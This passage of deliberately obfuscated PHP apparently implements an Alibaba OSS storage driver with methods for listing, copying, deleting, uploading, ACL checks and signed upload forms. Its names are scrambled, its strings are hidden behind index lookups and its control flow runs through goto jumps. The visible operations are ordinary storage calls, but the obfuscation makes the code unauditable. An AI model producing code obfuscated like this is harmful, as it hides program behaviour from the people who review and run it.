$dâèÚÏ•¢² = 1000; $FÓ‡¿¸‘ï¸ = $fä‚Á×•˜” = array(); goto EÂ“Ö•¸ªÛ; Aæ¤ôèïÏ: $aÊè÷È‡³ƒ =& $_SERVER[¢à]; $B› Éó•³³ = trim($B› Éó•³³, $aÊè÷È‡³ƒ[8]); $eìã™Üášè = empty($B› Éó•³³) ? $aÊè÷È‡³ƒ[33] : $B› Éó•³³ . $aÊè÷È‡³ƒ[8]; goto a¢ğŠîì÷¼; EÂ“Ö•¸ªÛ: while (!0) { $Eë‡µöÈ…‚ = array($aÊè÷È‡³ƒ[1170] => $a†ÃÑíîºÛ, $aÊè÷È‡³ƒ[183] => $eìã™Üášè, $aÊè÷È‡³ƒ[1171] => $dâèÚÏ•¢², $aÊè÷È‡³ƒ[1172] => $eœƒ³¹¿Û); try { $fİÖàƒ”Ü = $this->client->listObjects($this->bucket, $Eë‡µöÈ…‚); } catch (OSS\Core\OssException $C—åìÔÂÜ×) { break; } $eœƒ³¹¿Û = $fİÖàƒ”Ü->getNextMarker(); $a§Œ¤ÎÈÉ‘ = $fİÖàƒ”Ü->getObjectList(); $D‚¯É®Òï· = $fİÖàƒ”Ü->getPrefixList(); foreach ($a§Œ¤ÎÈÉ‘ as $EÂ–µî¾š) { if ($EÂ–µî¾š->getKey() == $eìã™Üášè) { continue; } $DŞ÷‚íĞÚ¥ = $EÂ–µî¾š->getKey(); if ($aĞÈãö”¬) { $DŞ÷‚íĞÚ¥ = array($aÊè÷È‡³ƒ[28] => $DŞ÷‚íĞÚ¥, $aÊè÷È‡³ƒ[77] => $EÂ–µî¾š->getSize(), $aÊè÷È‡³ƒ[187] => strtotime($EÂ–µî¾š->getLastModified())); } $fä‚Á×•˜”[] = $DŞ÷‚íĞÚ¥; } foreach ($D‚¯É®Òï· as $A‡¥¹¤¦¸™) { $FÓ‡¿¸‘ï¸[] = $A‡¥¹¤¦¸™->getPrefix(); } if ($eœƒ³¹¿Û === $aÊè÷È‡³ƒ[33]) { break; } } return array($aÊè÷È‡³ƒ[74] => $FÓ‡¿¸‘ï¸, $aÊè÷È‡³ƒ[73] => $fä‚Á×•˜”); goto FŠöš‚ß…É; FŠöš‚ß…É: } public function copyFile($fäÜ—®ÈñÏ, $d“¡Ô»Œ¹) { $a‰Ãğ¡È”× = $this->size($fäÜ—®ÈñÏ); if ($a‰Ãğ¡È”× < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $fäÜ—®ÈñÏ, $this->bucket, $this->pathEncode($d“¡Ô»Œ¹)); } catch (OSS\Core\OssException $cÅ°öÖ§éÍ) { return !1; } return !0; } return $this->multiCopyObject($fäÜ—®ÈñÏ, $d“¡Ô»Œ¹, $a‰Ãğ¡È”×); } private function multiCopyObject($F¡ìØ‚‘³È, $f·À¼øìÈ, $a°Êá¨õ¶†) { $fÅãİ·Ñ” =& $_SERVER[¢à]; try { goto B§ôÄœß‰ã; DŒòö´Ì: $Bö¬¿É¯å¬ = 1; $eïË£È—µƒ = 0; $Fâ “¥êêŠ = array(); goto DÃÔ¬²¥¿Ü; DÃÔ¬²¥¿Ü: $e“ÉÈ«ßŠ• = $this->osChunkSize(); $E¹áò²‘¨ˆ = $this->client->generateMultiuploadParts($a°Êá¨õ¶†, $e“ÉÈ«ßŠ•); foreach ($E¹áò²‘¨ˆ as $f¥¦êÚ”¯ => $f„ÛîªìÃÊ) { $B¤ƒÛ°‡İ› = $eïË£È—µƒ + (int) $f„ÛîªìÃÊ[$fÅãİ·Ñ”[1174]]; $fÛìêñÍÆ˜ = (int) $f„ÛîªìÃÊ[$fÅãİ·Ñ”[322]] + $B¤ƒÛ°‡İ› - 1; $dóÉÆ”ÆÙã = array($fÅãİ·Ñ”[1175] => $B¤ƒÛ°‡İ›, $fÅãİ·Ñ”[1176] => $fÛìêñÍÆ˜); $Fâ “¥êêŠ[] = $this->client->uploadPartCopy($this->bucket, $F¡ìØ‚‘³È, $this->bucket, $this->pathEncode($f·À¼øìÈ), $Bö¬¿É¯å¬, $aÈ…”ò¼ê, $dóÉÆ”ÆÙã); $Bö¬¿É¯å¬ = $Bö¬¿É¯å¬ + 1; } goto DÉæòÇ¿; DÉæòÇ¿: $føß²½Ø‰ = array(); foreach ($Fâ “¥êêŠ as $f¥¦êÚ”¯ => $B–•åÒŠ—) { $føß²½Ø‰[] = array($fÅãİ·Ñ”[1177] => $f¥¦êÚ”¯ + 1, $fÅãİ·Ñ”[1178] => $B–•åÒŠ—); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($f·À¼øìÈ), $aÈ…”ò¼ê, $føß²½Ø‰); goto bØî¿Ñ…ô‰; B§ôÄœß‰ã: $B‚İ¬´â´æ = array(); if ($bö‘‡Àæ„ƒ = $this->hashMd5($F¡ìØ‚‘³È)) { $B‚İ¬´â´æ = array(OSS\OssClient::OSS_HEADERS => array($fÅãİ·Ñ”[1173] => $bö‘‡Àæ„ƒ)); } $aÈ…”ò¼ê = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($f·À¼øìÈ), $B‚İ¬´â´æ); goto DŒòö´Ì; bØî¿Ñ…ô‰: } catch (OSS\Core\OssException $cÔ¿ªš³ÃÓ) { return !1; } return !0; } public function moveFile($Fè˜Ùè“î, $bàÂè…·Å…) { if ($this->copyFile($Fè˜Ùè“î, $bàÂè…·Å…)) { $this->remove($Fè˜Ùè“î); return !0; } return !1; } public function delFile($EÊÀËŸ®“’) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($EÊÀËŸ®“’)); } catch (OSS\Core\OssException $A¡ó•†Á™ó) { return !1; } return !0; } public function delFolder($a“…ÅÙ…Ë) { $BñÀíãİ¾’ =& $_SERVER[¢à]; $A²¬¡»‹Á = $this->fileList($a“…ÅÙ…Ë); if (!empty($a“…ÅÙ…Ë) && !in_array(trim($a“…ÅÙ…Ë, $BñÀíãİ¾’[8]) . $BñÀíãİ¾’[8], $A²¬¡»‹Á[$BñÀíãİ¾’[73]])) { $A²¬¡»‹Á[$BñÀíãİ¾’[73]][] = trim($a“…ÅÙ…Ë, $BñÀíãİ¾’[8]) . $BñÀíãİ¾’[8]; } foreach (array_chunk($A²¬¡»‹Á[$BñÀíãİ¾’[73]], 1000) as $e„šî¢œò) { try { $this->client->deleteObjects($this->bucket, $e„šî¢œò); } catch (OSS\Core\OssException $E¢Û°Ş¤¢Ä) { continue; } } return !0; } public function rename($bÙ„Ú®ô’Å, $F­ÑÍ‚ï‹‚) { return $this->renameObject($bÙ„Ú®ô’Å, $F­ÑÍ‚ï‹‚); } private function fileInfo($b›¶×Ã˜™Š, $dÜßëØï®ç = array()) { goto cÚ§ˆÛçŒ; cÚ§ˆÛçŒ: $Aí‰Ë†µÎÊ =& $_SERVER[¢à]; $C•‹ØŒ…‘Í = array($Aí‰Ë†µÎÊ[28] => $this->pathThis($b›¶×Ã˜™Š), $Aí‰Ë†µÎÊ[75] => $this->getPathOuter($b›¶×Ã˜™Š), $Aí‰Ë†µÎÊ[29] => $Aí‰Ë†µÎÊ[164], $Aí‰Ë†µÎÊ[184] => 0, $Aí‰Ë†µÎÊ[107] => 0, $Aí‰Ë†µÎÊ[77] => 0, $Aí‰Ë†µÎÊ[157] => $this->ext($b›¶×Ã˜™Š), $Aí‰Ë†µÎÊ[185] => !0, $Aí‰Ë†µÎÊ[186] => !0); if (empty($dÜßëØï®ç)) { $eìÛõÌªŞŒ = $this->objectMeta($b›¶×Ã˜™Š); if (!$eìÛõÌªŞŒ) { return $C•‹ØŒ…‘Í; } $dÜßëØï®ç = array($Aí‰Ë†µÎÊ[107] => strtotime($eìÛõÌªŞŒ[$Aí‰Ë†µÎÊ[1179]]), $Aí‰Ë†µÎÊ[77] => $eìÛõÌªŞŒ[$Aí‰Ë†µÎÊ[1180]] + 0); } goto f¦Õ¸¼Øğ…; f¦Õ¸¼Øğ…: if (isset($dÜßëØï®ç[$Aí‰Ë†µÎÊ[77]])) { $C•‹ØŒ…‘Í[$Aí‰Ë†µÎÊ[77]] = $dÜßëØï®ç[$Aí‰Ë†µÎÊ[77]]; } if (isset($dÜßëØï®ç[$Aí‰Ë†µÎÊ[107]])) { $C•‹ØŒ…‘Í[$Aí‰Ë†µÎÊ[107]] = $dÜßëØï®ç[$Aí‰Ë†µÎÊ[107]]; } if (isset($dÜßëØï®ç[$Aí‰Ë†µÎÊ[187]]) && !trim($C•‹ØŒ…‘Í[$Aí‰Ë†µÎÊ[107]])) { $C•‹ØŒ…‘Í[$Aí‰Ë†µÎÊ[107]] = $dÜßëØï®ç[$Aí‰Ë†µÎÊ[187]]; } goto eŒ…Ø×ä¹î; eŒ…Ø×ä¹î: return $C•‹ØŒ…‘Í; goto DßÅ‚ƒ¾óÙ; DßÅ‚ƒ¾óÙ: } private function folderInfo($B”ñŒÏÜø, $e™±ªá‚Å = array()) { $c›¥‹¸¹Á =& $_SERVER[¢à]; $AÈÈ‰Ëğ£İ = array($c›¥‹¸¹Á[28] => $this->pathThis($B”ñŒÏÜø), $c›¥‹¸¹Á[75] => $this->getPathOuter($c›¥‹¸¹Á[8] . $B”ñŒÏÜø), $c›¥‹¸¹Á[29] => $c›¥‹¸¹Á[76], $c›¥‹¸¹Á[184] => 0, $c›¥‹¸¹Á[107] => 0, $c›¥‹¸¹Á[185] => !0, $c›¥‹¸¹Á[186] => !0); if (empty($e™±ªá‚Å)) { $B”ñŒÏÜø = rtrim($B”ñŒÏÜø, $c›¥‹¸¹Á[8]) . $c›¥‹¸¹Á[8]; $b´–œç¢–… = $this->objectMeta($B”ñŒÏÜø); if (!$b´–œç¢–…) { return $AÈÈ‰Ëğ£İ; } $e™±ªá‚Å = array($c›¥‹¸¹Á[184] => $b´–œç¢–…[$c›¥‹¸¹Á[1181]][$c›¥‹¸¹Á[1182]], $c›¥‹¸¹Á[107] => strtotime($b´–œç¢–…[$c›¥‹¸¹Á[1179]])); } if (isset($e™±ªá‚Å[$c›¥‹¸¹Á[107]])) { $AÈÈ‰Ëğ£İ[$c›¥‹¸¹Á[107]] = $e™±ªá‚Å[$c›¥‹¸¹Á[107]]; } if (isset($e™±ªá‚Å[$c›¥‹¸¹Á[184]])) { $AÈÈ‰Ëğ£İ[$c›¥‹¸¹Á[184]] = $e™±ªá‚Å[$c›¥‹¸¹Á[184]]; } return $AÈÈ‰Ëğ£İ; } public function listPath($fÆÄ…”¢ß‹, $D‚Àš¬Ò¿ = false) { $Eˆ¨ç¤ÊÒ =& $_SERVER[¢à]; $bÇÂÕÖ‚“ = $this->fileList($fÆÄ…”¢ß‹, $Eˆ¨ç¤ÊÒ[8], !0); foreach ($bÇÂÕÖ‚“[$Eˆ¨ç¤ÊÒ[74]] as $e‰´›ƒ¼Ä÷ => $C³õíªÈòØ) { $bÇÂÕÖ‚“[$Eˆ¨ç¤ÊÒ[74]][$e‰´›ƒ¼Ä÷] = $this->folderInfo($C³õíªÈòØ, $C³õíªÈòØ); } foreach ($bÇÂÕÖ‚“[$Eˆ¨ç¤ÊÒ[73]] as $e‰´›ƒ¼Ä÷ => $C³õíªÈòØ) { $bÇÂÕÖ‚“[$Eˆ¨ç¤ÊÒ[73]][$e‰´›ƒ¼Ä÷] = $this->fileInfo($C³õíªÈòØ[$Eˆ¨ç¤ÊÒ[28]], $C³õíªÈòØ); } return $bÇÂÕÖ‚“; } public function has($DŠãŞ¨“, $a‹Ğ“ª‰ãÌ = false, $fÔ—¸ôÔÌ = true) { goto C‡áÌÓ°à’; b§÷•šçÂ–: $CøÎ»ˆÇ¿Ñ = $cø»¡é©î¼[33]; $E”íÒÎ®ö = 500; $fÚ…³ñ·°¼ = 0; goto B¡’‘ÑŸ­; dÜğÒì¬ˆõ: return !1; goto C¡…õ‚¿«˜; C‡áÌÓ°à’: $cø»¡é©î¼ =& $_SERVER[¢à]; $DŠãŞ¨“ = trim($DŠãŞ¨“, $cø»¡é©î¼[8]); $EÛèµ¹Éö = empty($DŠãŞ¨“) ? $cø»¡é©î¼[33] : $DŠãŞ¨“ . $cø»¡é©î¼[8]; goto b§÷•šçÂ–; B¡’‘ÑŸ­: $Bä‡™¸Ä½Ü = 0; while (!0) { $fÏ±Òó˜ƒŒ = array($cø»¡é©î¼[1170] => $cø»¡é©î¼[8], $cø»¡é©î¼[183] => $EÛèµ¹Éö, $cø»¡é©î¼[1171] => $E”íÒÎ®ö, $cø»¡é©î¼[1172] => $CøÎ»ˆÇ¿Ñ); try { $Eó›ÚŒ»± = $this->client->listObjects($this->bucket, $fÏ±Òó˜ƒŒ); } catch (OSS\Core\OssException $c¢§Û ¹ ) { break; } $CøÎ»ˆÇ¿Ñ = $Eó›ÚŒ»±->getNextMarker(); $dÏ™ï£Ã = $Eó›ÚŒ»±->getObjectList(); $Aã Ä‹±Î‹ = $Eó›ÚŒ»±->getPrefixList(); if ($a‹Ğ“ª‰ãÌ) { if (count($dÏ™ï£Ã) > 1 || count($dÏ™ï£Ã) == 1 && $dÏ™ï£Ã[0]->getKey() != $EÛèµ¹Éö) { $fÚ…³ñ·°¼ += count($dÏ™ï£Ã) - 1; } if (!empty($Aã Ä‹±Î‹)) { $Bä‡™¸Ä½Ü += count($Aã Ä‹±Î‹); } if ($CøÎ»ˆÇ¿Ñ === $cø»¡é©î¼[33]) { break; } continue; } if ($fÔ—¸ôÔÌ) { if (!empty($dÏ™ï£Ã)) { if (count($dÏ™ï£Ã) > 1 || $dÏ™ï£Ã[0]->getKey() != $EÛèµ¹Éö) { return !0; } } } else { if (!empty($Aã Ä‹±Î‹)) { return !0; } } if ($CøÎ»ˆÇ¿Ñ === $cø»¡é©î¼[33]) { break; } } if ($a‹Ğ“ª‰ãÌ) { return array($cø»¡é©î¼[188] => $fÚ…³ñ·°¼, $cø»¡é©î¼[189] => $Bä‡™¸Ä½Ü); } goto dÜğÒì¬ˆõ; C¡…õ‚¿«˜: } public function listAll($a¥ƒò‡È®) { $CË„âáÏà =& $_SERVER[¢à]; $Dè™Š¿—ùÑ = $this->fileList($a¥ƒò‡È®, $CË„âáÏà[33], !0); $bÃÁÆÌ¯ºÄ = array(); foreach ($Dè™Š¿—ùÑ[$CË„âáÏà[73]] as $BŒ´éá¢˜”) { $bÃÁÆÌ¯ºÄ[$BŒ´éá¢˜”[$CË„âáÏà[28]]] = $BŒ´éá¢˜”[$CË„âáÏà[77]]; } return $this->listAllFiles($a¥ƒò‡È®, array_keys($bÃÁÆÌ¯ºÄ), $bÃÁÆÌ¯ºÄ); } public function canRead($bâ‡‹¹ÄÔ) { $fá†®©”÷‹ =& $_SERVER[¢à]; $EÀÎöÊÁˆ¿ = $this->pathAcl($bâ‡‹¹ÄÔ); return $EÀÎöÊÁˆ¿ == $fá†®©”÷‹[1183] || $EÀÎöÊÁˆ¿ == $fá†®©”÷‹[487] ? !0 : !1; } public function canWrite($AñÑØÜ›¬ ) { $DÙƒÎãêï‘ = $this->pathAcl($AñÑØÜ›¬ ); return $DÙƒÎãêï‘ == $_SERVER[¢à][487] ? !0 : !1; } public function pathAcl($C‡ç¿Ğ£Ê») { goto f¬í†ÃËŒ; Aï‘¯¥Ò…é: return $C½¼ö‚ªÔŸ; goto BŞõÍÊ‰í ; f¬í†ÃËŒ: $E£÷‚”ø‚– =& $_SERVER[¢à]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $b¤•Ô“ÀË× = $this->client->getObjectAcl($this->bucket, $this->pathEncode($C‡ç¿Ğ£Ê»)); } catch (OSS\Core\OssException $eöãÔ¶Îù) { return !1; } goto B°†Èæ‰­²; B°†Èæ‰­²: $C½¼ö‚ªÔŸ = $b¤•Ô“ÀË× == $E£÷‚”ø‚–[34] ? $this->bucketAcl : $b¤•Ô“ÀË×; if ($C½¼ö‚ªÔŸ == $E£÷‚”ø‚–[1184]) { return $E£÷‚”ø‚–[1183]; } if ($C½¼ö‚ªÔŸ == $E£÷‚”ø‚–[1185]) { return $E£÷‚”ø‚–[487]; } goto Aï‘¯¥Ò…é; BŞõÍÊ‰í : } private function chmodPath($d£ø‡„ğ¡, $D²‚ïŒïô = '') { $E´©ŒÆíÔ’ =& $_SERVER[¢à]; $A¿ìØ…Ï = empty($D²‚ïŒïô) ? $E´©ŒÆíÔ’[1185] : $D²‚ïŒïô; $aÄàšïÇÇï = array($E´©ŒÆíÔ’[34], $E´©ŒÆíÔ’[182], $E´©ŒÆíÔ’[1184], $E´©ŒÆíÔ’[1185]); if (!in_array($A¿ìØ…Ï, $aÄàšïÇÇï)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($d£ø‡„ğ¡), $A¿ìØ…Ï); } catch (OSS\Core\OssException $eÃãÑÈÜÕŸ) { return !1; } return !0; } public function getContent($eŠáÄßÂù») { return $this->fileSubstr($eŠáÄßÂù», -1); } public function setContent($d‚ÔÉÂˆãŠ, $c¸Ë«ÉáÓÆ = '') { $cÏ¸‡ œîÂ =& $_SERVER[¢à]; try { $BØ»ëÄÒË = $this->trafficLimit($cÏ¸‡ œîÂ[1186]); $B»š‡ÊöÎø = $this->client->putObject($this->bucket, $this->pathEncode($d‚ÔÉÂˆãŠ), $c¸Ë«ÉáÓÆ, $BØ»ëÄÒË); } catch (OSS\Core\OssException $A…·ƒì£³‰) { return !1; } $EæÆ™ì¨Şò = array($cÏ¸‡ œîÂ[1173] => trim($B»š‡ÊöÎø[$cÏ¸‡ œîÂ[1187]], $cÏ¸‡ œîÂ[113]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($d‚ÔÉÂˆãŠ))); $this->updateObjMeta($d‚ÔÉÂˆãŠ, $EæÆ™ì¨Şò); return isset($B»š‡ÊöÎø[$cÏ¸‡ œîÂ[1188]][$cÏ¸‡ œîÂ[1135]]) ? (int) $B»š‡ÊöÎø[$cÏ¸‡ œîÂ[1188]][$cÏ¸‡ œîÂ[1135]] : strlen($B»š‡ÊöÎø); } private function updateObjMeta($fšËá×ùÏÛ, $cœÍÄØŸí) { $fšËá×ùÏÛ = $this->pathEncode($fšËá×ùÏÛ); try { $EÂ«î½¼ÓÈ = array(OSS\OssClient::OSS_HEADERS => $cœÍÄØŸí); $this->client->copyObject($this->bucket, $fšËá×ùÏÛ, $this->bucket, $fšËá×ùÏÛ, $EÂ«î½¼ÓÈ); } catch (OSS\Core\OssException $F¾öÎ‚á) { return !1; } return !0; } public function upload($E•×ô”í„½, $cÍš¶ºÚ÷¢, $aØ¢È©˜ = false, $AŠÉöƒƒçó = REPEAT_REPLACE) { $eòÏÊ¨–ëÒ =& $_SERVER[¢à]; $e®æ˜æÇ©ó = trim($E•×ô”í„½, $eòÏÊ¨–ëÒ[8]); $dÄ›õ‡£À¡ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => $this->osChunkSize(), OSS\OssClient::OSS_HEADERS => array($eòÏÊ¨–ëÒ[1173] => @md5_file($cÍš¶ºÚ÷¢)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($E•×ô”í„½))); $dÄ›õ‡£À¡ = $this->trafficLimit($eòÏÊ¨–ëÒ[1186], $dÄ›õ‡£À¡); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($e®æ˜æÇ©ó), $cÍš¶ºÚ÷¢, $dÄ›õ‡£À¡); } catch (OSS\Core\OssException $cŠÚç…©Ÿ©) { return !1; } return $this->getPathOuter($E•×ô”í„½); } public function getHost() { $a–¢°êŞíÇ =& $_SERVER[¢à]; $BÅ‡àØèØ = explode($a–¢°êŞíÇ[168], parent::getHost()); return $BÅ‡àØèØ[0] . $a–¢°êŞíÇ[168] . $this->bucket . $a–¢°êŞíÇ[93] . $BÅ‡àØèØ[1]; } public function uploadFormData($bïÜâÙÕÇ, $d‘¡šŒ±ˆ = 3600) { goto e—Ûë¶¸; D‘ã¬šØÕç: return $BˆÊù¬ø‰; goto F’¾Ã¹Œ; e—Ûë¶¸: $CŠ»¶™åâ =& $_SERVER[¢à]; if (!($B½ÙğƒÖ®Ï = $this->getHost())) { return !1; } $B‘™ãñ å§ = $d‘¡šŒ±ˆ; goto CÇ¼Óõ½Å¿; B¹Ò…ë·Ÿ: $c”ô¹áº = $this->pathFather($bïÜâÙÕÇ); $Eßæ§¥ˆ ß = array($CŠ»¶™åâ[1091] => $A§çä–åğ, $CŠ»¶™åâ[1092] => array(array($CŠ»¶™åâ[1191], 0, $e¹š¤ËÎƒ), array($CŠ»¶™åâ[1095], $CŠ»¶™åâ[1096], $c”ô¹áº))); $b–çÂƒƒø = base64_encode(json_encode($Eßæ§¥ˆ ß)); goto B·çÖÀƒè; B·çÖÀƒè: $d±³§•å…“ = base64_encode(hash_hmac($CŠ»¶™åâ[215], $b–çÂƒƒø, $this->secret, !0)); $BˆÊù¬ø‰ = array($CŠ»¶™åâ[1101] => $b–çÂƒƒø, $CŠ»¶™åâ[1192] => $this->accessKey, $CŠ»¶™åâ[1097] => $CŠ»¶™åâ[1089], $CŠ»¶™åâ[1193] => $d±³§•å…“, $CŠ»¶™åâ[166] => $B½ÙğƒÖ®Ï); $BˆÊù¬ø‰ = $this->trafficLimit($CŠ»¶™åâ[1186], $BˆÊù¬ø‰); goto D‘ã¬šØÕç; D¾Æ˜¤Ûìƒ: $Bñ„‹ó¯´ä = strpos($A§çä–åğ, $CŠ»¶™åâ[281]); $A§çä–åğ = substr($A§çä–åğ, 0, $Bñ„‹ó¯´ä) . $CŠ»¶™åâ[1190]; $e¹š¤ËÎƒ = 1048576000 * 5; goto B¹Ò…ë·Ÿ; CÇ¼Óõ½Å¿: $d‹±ï›§£¡ = date($CŠ»¶™åâ[1189], time() + $B‘™ãñ å§); $eÀËª«“ = new DateTime($d‹±ï›§£¡); $A§çä–åğ = $eÀËª«“->format(DateTime::ISO8601); goto D¾Æ˜¤Ûìƒ; F’¾Ã¹Œ: } public function multiUploadFormData($f¨Ñ¨„ È–, $BÍî„šÃ¹š = 3600) { $dâ‡Üßäõ  =& $_SERVER[¢à]; if (!($bèôâß’˜Ù = $this->getHost())) { return !1; } $f¾‚Ä¡†º¯ = $this->trafficLimit($dâ‡Üßäõ [1186]); $b¢àßñ³× = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($f¨Ñ¨„ È–), $f¾‚Ä¡†º¯); return array($dâ‡Üßäõ [206] => $b¢àßñ³×, $dâ‡Üßäõ [166] => $bèôâß’˜Ù . $dâ‡Üßäõ [8] . $this->pathEncode($f¨Ñ¨„ È–), $dâ‡Üßäõ [207] => gmdate($dâ‡Üßäõ [1194]), $dâ‡Üßäõ [89] => $f¨Ñ¨„ È–); } public function multiUploadAuthData($AÅòçÕ ğ, $Cñ¯ƒ â = array()) { goto e™Îç„²Øá; aÔ¸›×âƒ: $dç…ÇğÄçÀ = $AÅòçÕ ğ; if (isset($Cñ¯ƒ â[$A‰ƒ¡é´êÄ[89]])) { $dç…ÇğÄçÀ = $Cñ¯ƒ â[$A‰ƒ¡é´êÄ[89]]; unset($Cñ¯ƒ â[$A‰ƒ¡é´êÄ[89]]); } if (isset($Cñ¯ƒ â[$A‰ƒ¡é´êÄ[208]])) { $Cñ¯ƒ â[$A‰ƒ¡é´êÄ[207]] = $aíò…”ÌÑï; return $this->listUploadParts($dç…ÇğÄçÀ, $Cñ¯ƒ â); } goto dµÀÄÒ‘Ñ; BÍô£é‰¥: if (!empty($Cñ¯ƒ â[$A‰ƒ¡é´êÄ[1196]])) { $b½ÔùÇÒãˆ = array_merge(array($Eèµ‚”“ˆÚ[4]), $Cñ¯ƒ â[$A‰ƒ¡é´êÄ[1196]]); sort($b½ÔùÇÒãˆ); $Eèµ‚”“ˆÚ[4] = implode($A‰ƒ¡é´êÄ[214], $b½ÔùÇÒãˆ); } $d¥¶Ë·âğ = implode($A‰ƒ¡é´êÄ[214], $Eèµ‚”“ˆÚ); $BñÖ„£²” = base64_encode(hash_hmac($A‰ƒ¡é´êÄ[215], $d¥¶Ë·âğ, $this->secret, !0)); goto c÷¡£×ŞÎ; dµÀÄÒ‘Ñ: $Eèµ‚”“ˆÚ = array($A‰ƒ¡é´êÄ[209], $A‰ƒ¡é´êÄ[33], $A‰ƒ¡é´êÄ[116], $aíò…”ÌÑï, "\170\55\x6f\163\163\x2d\144\x61\x74\145\x3a{$aíò…”ÌÑï}", $A‰ƒ¡é´êÄ[8] . $this->bucket . $A‰ƒ¡é´êÄ[8] . $dç…ÇğÄçÀ . $C¥»ƒ‘°Ùç); if (strpos($C¥»ƒ‘°Ùç, $A‰ƒ¡é´êÄ[210]) === 0) { $Eèµ‚”“ˆÚ[0] = $A‰ƒ¡é´êÄ[211]; if ($b›ô´³Ì = $this->trafficLimit($A‰ƒ¡é´êÄ[1186])) { $dç…ÇğÄçÀ = $A‰ƒ¡é´êÄ[1195]; array_splice($Eèµ‚”“ˆÚ, 5, 0, $dç…ÇğÄçÀ . $A‰ƒ¡é´êÄ[4] . $b›ô´³Ì[$dç…ÇğÄçÀ]); } } if (isset($Cñ¯ƒ â[$A‰ƒ¡é´êÄ[212]]) && $Cñ¯ƒ â[$A‰ƒ¡é´êÄ[212]] == $A‰ƒ¡é´êÄ[213]) { $Eèµ‚”“ˆÚ[0] = $A‰ƒ¡é´êÄ[213]; } goto BÍô£é‰¥; c÷¡£×ŞÎ: $F´Î·Ù£‰ğ = $A‰ƒ¡é´êÄ[1197] . $this->accessKey . $A‰ƒ¡é´êÄ[4] . $BñÖ„£²”; if (strpos($C¥»ƒ‘°Ùç, $A‰ƒ¡é´êÄ[210]) === 0) { $F´Î·Ù£‰ğ = array($A‰ƒ¡é´êÄ[217] => $F´Î·Ù£‰ğ, $A‰ƒ¡é´êÄ[207] => $aíò…”ÌÑï); if ($b›ô´³Ì) { $F´Î·Ù£‰ğ = array_merge($F´Î·Ù£‰ğ, $b›ô´³Ì); } } return $F´Î·Ù£‰ğ; goto dˆîæ¼«Ø; e™Îç„²Øá: $A‰ƒ¡é´êÄ =& $_SERVER[¢à]; $aíò…”ÌÑï = isset($Cñ¯ƒ â[$A‰ƒ¡é´êÄ[207]]) ? $Cñ¯ƒ â[$A‰ƒ¡é´êÄ[207]] : gmdate($A‰ƒ¡é´êÄ[1194]); $C¥»ƒ‘°Ùç = isset($Cñ¯ƒ â[$A‰ƒ¡é´êÄ[157]]) ? $Cñ¯ƒ â[$A‰ƒ¡é´êÄ[157]] : $A‰ƒ¡é´êÄ[33]; goto aÔ¸›×âƒ; dˆîæ¼«Ø: } public function listUploadParts($bŞ‹ò–¯“ê, $a½İåêËØ‹) { goto eÎèãˆÁ©; eÎèãˆÁ©: $D‡ˆÜİí¥² =& $_SERVER[¢à]; $D®ì¯Ù½¸‚ = parse_url_query($a½İåêËØ‹[$D‡ˆÜİí¥²[157]]); $FÚ¶›”Ì‚Ô = $this->client->listParts($this->bucket, $this->pathEncode($bŞ‹ò–¯“ê), $D®ì¯Ù½¸‚[$D‡ˆÜİí¥²[206]]); goto eÉ£ÍÙÈ„; eÉ£ÍÙÈ„: $EõÎ…ìª†é = $FÚ¶›”Ì‚Ô->getListPart(); $Cµ¼ÆÎ¤Ğ” = array(); foreach ($EõÎ…ìª†é as $b³ÌéÁ•ô) { $Cµ¼ÆÎ¤Ğ”[] = array($D‡ˆÜİí¥²[1177] => $b³ÌéÁ•ô->getPartNumber(), $D‡ˆÜİí¥²[1178] => trim($b³ÌéÁ•ô->getETag(), $D‡ˆÜİí¥²[113])); } goto aôô’Éè½â; B‡ê‡òÃˆ: return array($D‡ˆÜİí¥²[217] => $a»‰½áĞÒ, $D‡ˆÜİí¥²[207] => $a½İåêËØ‹[$D‡ˆÜİí¥²[207]], $D‡ˆÜİí¥²[219] => $Cµ¼ÆÎ¤Ğ”); goto eñµèáÛ×†; aôô’Éè½â: unset($a½İåêËØ‹[$D‡ˆÜİí¥²[208]], $a½İåêËØ‹[$D‡ˆÜİí¥²[212]]); $a»‰½áĞÒ = $this->multiUploadAuthData($bŞ‹ò–¯“ê, $a½İåêËØ‹); if (empty($a»‰½áĞÒ)) { return !1; } goto B‡ê‡òÃˆ; eñµèáÛ×†: } public function download($b“ãä‹îùİ, $e“ôÖ¸) { if ($this->isFolder($b“ãä‹îùİ)) { return !1; } try { $AÉô¼Ï”æŠ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $e“ôÖ¸); $AÉô¼Ï”æŠ = $this->trafficLimit($_SERVER[¢à][105], $AÉô¼Ï”æŠ); $this->client->getObject($this->bucket, $this->pathEncode($b“ãä‹îùİ), $AÉô¼Ï”æŠ); } catch (OSS\Core\OssException $b–‹ñçô®®) { return !1; } return $e“ôÖ¸; } public function fileSubstr($D§ÖõøÙ¨¾, $BÇ½ˆì¶ë– = 0, $f‘Íì¬Ç‰— = false) { if ($BÇ½ˆì¶ë– === -1) { $A‚£ºùÔ‹Š = array(); } else { if ($f‘Íì¬Ç‰— === !1) { $bÛ…ÏÕùŸÁ = $this->size($D§ÖõøÙ¨¾); } else { $bÛ…ÏÕùŸÁ = $BÇ½ˆì¶ë– + $f‘Íì¬Ç‰— - 1; } $A‚£ºùÔ‹Š = array(OSS\OssClient::OSS_RANGE => "{$BÇ½ˆì¶ë–}\55{$bÛ…ÏÕùŸÁ}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($D§ÖõøÙ¨¾), $A‚£ºùÔ‹Š); } catch (OSS\Core\OssException $BèŠù·¤¶) { think_exception($BèŠù·¤¶->getMessage()); return !1; } } private function trafficLimit($E¼Ù©¯Øğ„, $B¹ŸĞ¾Àìë = array()) { goto C÷§Üê©ß; c˜Ø ƒöÉ‡: if (!$A¥Öšîš‡­) { return $B¹ŸĞ¾Àìë; } $A¥Öšîš‡­ = $A¥Öšîš‡­ < 819200 